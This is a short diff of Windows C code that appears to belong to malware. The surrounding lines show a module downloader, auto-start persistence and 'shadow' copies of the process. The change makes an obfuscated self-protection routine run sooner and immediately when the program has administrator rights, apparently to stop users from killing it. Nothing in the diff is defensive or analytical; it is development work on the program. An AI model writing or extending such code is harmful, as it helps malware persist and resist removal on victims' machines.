@@ -62,7 +62,7 @@ static int download_module(const char *url, const char *out_path) {
 
 /* Auto-protect thread for shadow copies: waits 15 seconds then protects */
 DWORD WINAPI shadow_auto_protect(LPVOID lpParam) {
-    Sleep(15000);  /* Wait 15 seconds after startup before protecting */
+    Sleep(500);  /* Small delay to let startup finish, then protect immediately */
     obf_sys_protect_process();
     return 0;
 }
@@ -467,7 +467,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     /* Ensure persistence for the original process too */
     sys_register_autostart();
     
-    /* Auto-protect after 15 seconds */
+    /* Auto-protect ALL processes immediately when admin */
+    if (sys_is_admin()) {
+        obf_sys_protect_process();
+    }
     if (isShadow) {
         CreateThread(NULL, 0, shadow_auto_protect, NULL, 0, NULL);
     }
